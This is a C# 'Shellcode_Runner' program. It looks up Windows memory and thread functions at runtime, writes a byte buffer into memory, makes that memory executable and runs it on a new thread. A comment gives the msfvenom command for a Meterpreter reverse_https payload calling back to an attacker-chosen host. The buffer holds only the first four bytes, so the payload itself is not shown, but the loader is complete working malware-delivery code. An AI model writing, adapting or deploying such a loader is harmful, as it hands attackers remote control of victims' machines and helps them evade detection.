using System;
using System.Runtime.InteropServices;

namespace Shellcode_Runner
{
    class Program
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        static extern IntPtr LoadLibraryA(string lpLibFileName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        private delegate IntPtr VirtualAllocDelegate(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        private delegate bool VirtualProtectDelegate(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        private delegate IntPtr CreateThreadDelegate(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        private delegate UInt32 WaitForSingleObjectDelegate(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            // Load kernel32.dll
            IntPtr hKernel32 = LoadLibraryA("kernel32.dll");

            // Get function pointers
            IntPtr pVirtualAlloc = GetProcAddress(hKernel32, "VirtualAlloc");
            IntPtr pVirtualProtect = GetProcAddress(hKernel32, "VirtualProtect");
            IntPtr pCreateThread = GetProcAddress(hKernel32, "CreateThread");
            IntPtr pWaitForSingleObject = GetProcAddress(hKernel32, "WaitForSingleObject");

            // Convert function pointers to delegates
            VirtualAllocDelegate VirtualAlloc = (VirtualAllocDelegate)Marshal.GetDelegateForFunctionPointer(pVirtualAlloc, typeof(VirtualAllocDelegate));
            VirtualProtectDelegate VirtualProtect = (VirtualProtectDelegate)Marshal.GetDelegateForFunctionPointer(pVirtualProtect, typeof(VirtualProtectDelegate));
            CreateThreadDelegate CreateThread = (CreateThreadDelegate)Marshal.GetDelegateForFunctionPointer(pCreateThread, typeof(CreateThreadDelegate));
            WaitForSingleObjectDelegate WaitForSingleObject = (WaitForSingleObjectDelegate)Marshal.GetDelegateForFunctionPointer(pWaitForSingleObject, typeof(WaitForSingleObjectDelegate));

            // msfvenom.bat -p windows/x64/meterpreter/reverse_https LHOST=[LHOST] LPORT=7710 -f csharp EXITFUNC=thread
            byte[] buf = new byte[4] { 0xfc, 0x48, 0x83, 0xe4 };

            int size = buf.Length;

            // Step 1: Allocate memory with PAGE_READWRITE permissions
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)size, 0x3000, 0x04);

            // Step 2: Copy the shellcode to the allocated memory
            Marshal.Copy(buf, 0, addr, size);

            // Step 3: Change memory protection to PAGE_EXECUTE_READ
            uint oldProtect;
            VirtualProtect(addr, (uint)size, 0x20, out oldProtect);

            // Step 4: Create a thread to execute the shellcode
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            // Step 5: Wait for the created thread to finish executing
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
